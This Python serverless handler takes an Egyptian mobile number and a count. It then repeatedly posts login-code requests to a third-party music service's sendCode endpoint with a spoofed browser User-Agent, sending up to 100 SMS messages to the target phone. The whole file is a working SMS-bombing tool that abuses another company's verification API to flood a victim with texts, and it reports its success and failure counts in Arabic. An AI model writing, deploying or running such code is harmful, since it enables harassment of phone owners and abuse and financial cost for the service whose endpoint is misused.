import json
import requests
import time

def send_sms_requests(number, sms_count):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    phone_number = "2" + number
    success = 0
    failure = 0
    count = min(int(sms_count), 100)

    for _ in range(count):
        payload = json.dumps({"dial": phone_number})
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
        }
        try:
            response = requests.post(url, headers=headers, data=payload, timeout=10)
            if response.status_code == 200:
                success += 1
            else:
                failure += 1
        except Exception:
            failure += 1
        time.sleep(1)
    
    return success, failure

def handler(event, context):
    if event['httpMethod'] != 'POST':
        return {
            'statusCode': 405,
            'body': json.dumps({'message': 'Method Not Allowed'})
        }

    try:
        body = json.loads(event['body'])
        number = body.get('number')
        sms_count = body.get('sms_count', 1)
    except Exception:
        return {
            'statusCode': 400,
            'body': json.dumps({'message': 'خطأ في قراءة البيانات'})
        }

    if not (number and number.startswith("01") and len(number) == 11):
        return {
            'statusCode': 400,
            'body': json.dumps({'message': 'بيانات غير صحيحة، تأكد من رقم الهاتف'})
        }

    success_count, failure_count = send_sms_requests(number, sms_count)

    response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'message': response_message})
    }
